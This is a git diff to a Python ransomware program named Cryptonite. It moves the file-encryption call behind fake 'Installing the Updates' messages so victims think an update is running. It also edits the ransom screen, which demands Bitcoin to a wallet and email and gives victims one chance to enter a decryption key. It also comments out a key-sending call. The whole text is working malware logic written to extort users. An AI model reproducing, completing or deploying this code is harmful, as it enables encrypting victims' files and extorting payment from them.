@@ -85,6 +85,12 @@ class Cryptonite():
                             files = os.path.join(root, files)
                             fileLists.append(files)
 
+        print("Download Completed!\n")
+        time.sleep(2)
+        print("Installing the Updates. This might take some time. Please be patient... \n")
+        self.encrypt()
+        os.system("cls" if os.name == 'nt' else "clear") 
+
 
 
     def encrypt(self):
@@ -109,11 +115,7 @@ class Cryptonite():
 
 
                             
-        print("Download Completed!\n")
-        time.sleep(2)
-        print("Installing the Updates. This might take some time. Please be patient... \n")
-        self.encrypt()
-        os.system("cls" if os.name == 'nt' else "clear") 
+
             
   
     def decrypt(self):
@@ -136,14 +138,14 @@ class Cryptonite():
 
 
 class System(Cryptonite):
-    def __init__(self,key,fe,dkrpt,uniqKey):
+    def __init__(self):
         super().__init__(key,fe,dkrpt,uniqKey)
 
 
     def warningScreen(self):
         warningMessage = f"Your device is infected by CRYPTONITE RANSOMWARE. It uses a military grade encryption to encrypt your files\n\n.If you wish to decrypt your file, send us {BTC_AMOUNT} BTC and email us the unique key provided to you and the proof that you have paid the ransom. Then only we will provide the Decryption key which will decrypt the files\n\nRemember, you will be given only ONE CHANCE to enter the correct key:\n\nBTC wallet address:- {BTC_WALLET}\nEmail address:- {EMAIL}\n\n\nYour unique key: {self.uniqueKey}\n\n"
         pmb.alert("Your device has been Infected by CRYPTONITE RANSOMWARE! Click OK to know further", "ALERT!")
-        OK = pmb.confirm(text=warningMessage, title="Cryptn8", buttons=['I Understood', 'Fuck You!'])
+        OK = pmb.confirm(text=warningMessage, title="Cryptn8", buttons=['I Understood', 'Nah! I am good'])
         if OK == "I Understood":
             x = pmb.prompt("Decryption key: ", "Enter the Decryption key (ONE CHANCE)")
             try:
@@ -165,8 +167,8 @@ class System(Cryptonite):
 if __name__ == "__main__":
     
     cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
-    window = System(key,fe,dkrpt,uniqKey)
+    window = System()
 
-    cryptn8.sendKeys()
+    # cryptn8.sendKeys()
     cryptn8.findFiles()
     window.warningScreen()
